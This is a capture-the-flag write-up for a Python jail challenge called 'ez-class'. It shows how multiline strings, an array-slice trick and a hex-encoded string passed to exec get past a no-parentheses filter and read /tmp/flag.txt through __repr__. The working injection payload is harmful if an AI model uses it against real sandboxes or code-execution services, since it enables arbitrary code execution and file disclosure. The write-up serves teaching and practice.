---
title: ez-class
author: Max
date: 2023-03-20
tags: [python, jail]
---

### Source code

[ez-class.py](./ez-class.py)

### First analysis

It seems we can write a class to a file, and open that class.
But we also have restrictions on what we can write that are applied when input gets validated by `get_legal_code`.
When running and selecting `1. Write new class` we are prompted with

- `{class name}`
- `{parent}`
- `{number of methods}`
- for each method:
  - `{name{i}}`
  - `{params{i}}`
  - `{body{i}}`

and out class will look like:

```
class {class name}({parent}):
  def {name{1}}({params{1}}):
    {body{1}}

  def {name{2}}({params{2}}):
    {body{2}}
  ...
```

In `exec_class()` our class gets printed, so `my_class.__repr__()` gets run to get it's string representation.

### Resolution

Since we can not write parentheses we want to highjack some.
If we can remove `def` in `def {name{2}}({params{2}}):` we would get closer to calling any funciton with any parameter.
Fortunatley there are multiline strings, so now our payload looks like:

```
class MyClass():
  def __repr__(self): # gets called when `exec_class` is called
    a="""

  def """;exec({params{2}}):
    {body{2}}
```

We still have a problem:
the colon at the end of `def {name{2}}({params{2}}):` gives us a syntax error since it is not valid python code.
This can be fixed by making it look like we are using that result to index an array, since `[][f(x):2]` is valid python code

```
class MyClass():
  def __repr__(self): # gets called when `exec_class` is called
    a="""

  def """;[][exec({params{2}}):
    2]
```

great, we can call any function!
now we just put `"print(open('/tmp/flag.txt').readlines())"` as a hexstring into `{params{2}}` to avoid parentheses invalidating our payload and we have our evil class

```python
class MyClass():
  def __repr__(self): # gets called when `exec_class` is called
    a="""

  def """;[][exec("\x70\x72\x69\x6e\x74\x28\x6f\x70\x65\x6e\x28\x27\x2f\x74\x6d\x70\x2f\x66\x6c\x61\x67\x2e\x74\x78\x74\x27\x29\x2e\x72\x65\x61\x64\x6c\x69\x6e\x65\x73\x28\x29\x29"):
    2]
```

By writing such class, then selecting `2. Run class` and providing the class name we get the `__repr__` method to be run that in turn runs the `exec` which prints the file and we get the flag!
